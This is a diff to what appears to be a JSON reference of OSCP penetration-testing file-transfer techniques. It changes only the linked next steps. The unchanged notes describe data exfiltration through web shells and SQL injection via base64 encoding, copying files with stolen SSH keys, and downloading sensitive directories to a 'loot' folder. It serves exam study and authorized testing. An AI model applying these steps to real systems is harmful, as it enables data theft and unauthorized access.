@@ -52,7 +52,7 @@
         "ft-curl-upload"
       ],
       "next_steps": [
-        "ft-base64-decode"
+        "ft-base64-encode"
       ],
       "notes": "OSCP METHODOLOGY: Use when only text-based exfiltration available (web shells, SQL injection, command injection with output only). Encodes binary files as printable text. Size increases ~33%.\n\nMANUAL ALTERNATIVE: Could use hex encoding (xxd), but base64 is more compact (hex is 2x size increase vs 1.33x).\n\nUSE CASES: \n- Copy/paste small files via RDP/VNC clipboard\n- Exfiltrate via SQL injection (SELECT base64_data)\n- Transfer via web shell echo output\n- Bypass file type restrictions\n\nEXAM TIP: Only practical for files <1MB due to terminal buffer limits and manual copy/paste. For larger files, use ft-nc-send or ft-curl-upload. After encoding, copy entire output (triple-click in terminal), paste to Kali, decode.\n\nDECODE ON KALI: echo '<BASE64_STRING>' | base64 -d > decoded_file\nDECODE ON WINDOWS: certutil -decode encoded.txt decoded.exe\nDECODE IN POWERSHELL: [System.Convert]::FromBase64String('<STRING>') | Set-Content -Encoding Byte decoded.exe\n\nTIME ESTIMATE: Encoding instant for files <10MB. Manual copy/paste adds 30-60 seconds.",
       "oscp_relevance": "medium"
@@ -122,8 +122,7 @@
         "ft-curl-upload"
       ],
       "next_steps": [
-        "ft-scp-download",
-        "ft-ssh-execute"
+        "ft-scp-download"
       ],
       "notes": "OSCP METHODOLOGY: Use when you have SSH credentials (password or key). Less common in OSCP than HTTP transfers, but useful when SSH is the primary access vector. Encrypted transfer, cleaner than setting up HTTP servers.\n\nMANUAL ALTERNATIVE: Could use SFTP interactively, but SCP is faster for scripting single file transfers.\n\nWHEN TO USE: \n- You have SSH credentials\n- Target allows SSH (port 22/custom port open)\n- Need encrypted transfer\n- Transferring to/from pivot boxes where you have SSH\n\nEXAM TIP: If you compromised SSH keys (/home/user/.ssh/id_rsa), use them: scp -i stolen_id_rsa file user@target:/tmp/. Remember -P (capital P) for non-standard ports.\n\nVS HTTP: SCP is encrypted and authenticated, but requires SSH access. HTTP is unauthenticated and works over more restricted firewalls.\n\nBIDIRECTIONAL: Use ft-scp-download for reverse transfer (target to Kali)\n\nTIME ESTIMATE: Fast, limited by network speed. 1-10MB/sec typical.",
       "oscp_relevance": "medium"
@@ -200,9 +199,7 @@
         "ft-curl-upload",
         "ft-nc-send"
       ],
-      "next_steps": [
-        "ft-file-verify-md5"
-      ],
+      "next_steps": [],
       "notes": "OSCP METHODOLOGY: Use for exfiltration when you have SSH credentials. Cleaner than setting up upload servers. Encrypted transfer. Less common in OSCP than HTTP uploads, but valuable when SSH is access method.\n\nMANUAL ALTERNATIVE: Could SSH in and cat file, redirect output, but SCP preserves binary files perfectly.\n\nWILDCARDS: Download multiple files: scp user@host:'/var/log/*.log' ./logs/ (quotes required around remote path with wildcards)\n\nEXAM TIP: If you compromised SSH keys, use them: scp -i stolen_key user@target:/root/proof.txt ./. For files you cannot read (permission denied), try to escalate privileges first or use sudo over SSH.\n\nDIRECTORY DOWNLOAD: Download entire directories: scp -r user@target:/opt/sensitive_data ./loot/\n\nVS HTTP UPLOAD: SCP is bidirectional (same tool for upload/download), encrypted, but requires SSH access. HTTP upload works through more restrictive firewalls.\n\nTIME ESTIMATE: Fast, limited by network speed. 1-10MB/sec typical. Near-instant for proof.txt.",
       "oscp_relevance": "medium"
     }
